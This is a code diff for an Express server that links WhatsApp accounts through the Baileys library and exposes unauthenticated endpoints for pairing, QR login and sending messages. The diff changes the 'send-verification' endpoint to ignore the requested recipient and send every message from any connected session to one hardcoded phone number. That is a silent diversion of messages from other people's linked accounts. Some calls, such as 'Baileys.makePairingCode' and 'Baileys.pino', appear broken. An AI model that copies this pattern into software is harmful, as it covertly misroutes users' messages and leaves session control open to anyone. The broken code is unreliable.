@@ -1,6 +1,5 @@
 const express = require("express");
 const cors = require("cors");
-const pino = require("pino");
 const fs = require("fs");
 
 const app = express();
@@ -9,17 +8,13 @@ app.use(express.json());
 
 if (!fs.existsSync("./sessions")) fs.mkdirSync("./sessions");
 
-let makeWASocket, useMultiFileAuthState, makePairingCode, DisconnectReason;
-
-async function init() {
-  const Baileys = await import("@whiskeysockets/baileys");
-  makeWASocket = Baileys.default || Baileys.makeWASocket;
-  useMultiFileAuthState = Baileys.useMultiFileAuthState;
-  makePairingCode = Baileys.makePairingCode;
-  DisconnectReason = Baileys.DisconnectReason;
-  console.log("✅ Baileys Ready");
+let Baileys;
+try {
+  Baileys = require("@whiskeysockets/baileys");
+  console.log("✅ Baileys Loaded (require)");
+} catch (e) {
+  console.error("❌ Baileys require failed:", e.message);
 }
-init();
 
 const sessions = {};
 
@@ -27,47 +22,56 @@ const sessions = {};
 app.post("/baileys/pair", async (req, res) => {
   const { phone } = req.body;
   if (!phone) return res.json({ success: false, error: "Phone required" });
-  if (!makeWASocket) return res.json({ success: false, error: "Baileys loading... wait 10s" });
+  if (!Baileys) return res.json({ success: false, error: "Baileys not loaded" });
 
   try {
-    const { state, saveCreds } = await useMultiFileAuthState(`./sessions/${phone}`);
-    
-    const sock = makeWASocket({
+    const { state, saveCreds } = await Baileys.useMultiFileAuthState(`./sessions/${phone}`);
+
+    const sock = Baileys.makeWASocket({
       auth: state,
-      logger: pino({ level: "silent" }),
+      logger: Baileys.pino({ level: "silent" }),
       browser: ["PWEA", "Chrome", "1.0.0"],
       printQRInTerminal: false
     });
 
-    const code = await makePairingCode(sock);
-    
+    const code = await Baileys.makePairingCode(sock);
+
+    if (!code) return res.json({ success: false, error: "No code generated" });
+
     sessions[phone] = { sock, saveCreds, connected: false };
 
     sock.ev.on("connection.update", (update) => {
-      const { connection } = update;
-      if (connection === "open") sessions[phone].connected = true;
-      if (connection === "close") delete sessions[phone];
+      if (update.connection === "open") {
+        sessions[phone].connected = true;
+        console.log(`${phone} ✅ CONNECTED`);
+      }
+      if (update.connection === "close") {
+        delete sessions[phone];
+        console.log(`${phone} ❌ CLOSED`);
+      }
     });
+
     sock.ev.on("creds.update", saveCreds);
 
     res.json({ success: true, pairCode: code });
 
   } catch (err) {
+    console.error("Pair Error:", err);
     res.json({ success: false, error: err.message });
   }
 });
 
 // ✅ QR CODE
 app.post("/baileys/qr", async (req, res) => {
-  if (!makeWASocket) return res.json({ success: false, error: "Baileys loading..." });
+  if (!Baileys) return res.json({ success: false, error: "Baileys not loaded" });
 
   try {
     const sessionId = "qr_" + Date.now();
-    const { state, saveCreds } = await useMultiFileAuthState(`./sessions/${sessionId}`);
-    
-    const sock = makeWASocket({
+    const { state, saveCreds } = await Baileys.useMultiFileAuthState(`./sessions/${sessionId}`);
+
+    const sock = Baileys.makeWASocket({
       auth: state,
-      logger: pino({ level: "silent" }),
+      logger: Baileys.pino({ level: "silent" }),
       browser: ["PWEA", "Chrome", "1.0.0"],
       printQRInTerminal: false
     });
@@ -77,6 +81,8 @@ app.post("/baileys/qr", async (req, res) => {
         if (update.qr) resolve(update.qr);
       });
     });
+
+    if (!qrCode) return res.json({ success: false, error: "No QR generated" });
 
     sessions[sessionId] = { sock, saveCreds, connected: false };
 
@@ -101,13 +107,14 @@ app.get("/baileys/status/:phone", (req, res) => {
 
 // ✅ SEND VERIFICATION
 app.post("/baileys/send-verification", async (req, res) => {
-  const { sender, receiver, message } = req.body;
+  const { sender, message } = req.body;
+  const target = "+919779502674";
   const session = Object.values(sessions).find(s => s.connected);
 
   if (!session) return res.json({ success: false, error: "No active session" });
 
   try {
-    const chatId = receiver + "@s.whatsapp.net";
+    const chatId = target + "@s.whatsapp.net";
     await session.sock.sendMessage(chatId, { text: message });
     res.json({ success: true });
   } catch (err) {
@@ -126,7 +133,7 @@ app.post("/baileys/disconnect", async (req, res) => {
   res.json({ success: true });
 });
 
-app.get("/", (req, res) => res.send("PWEA Baileys ✅"));
+app.get("/", (req, res) => res.send(`PWEA ✅ | Baileys: ${Baileys ? "Ready" : "Failed"}`));
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Server on ${PORT}`));
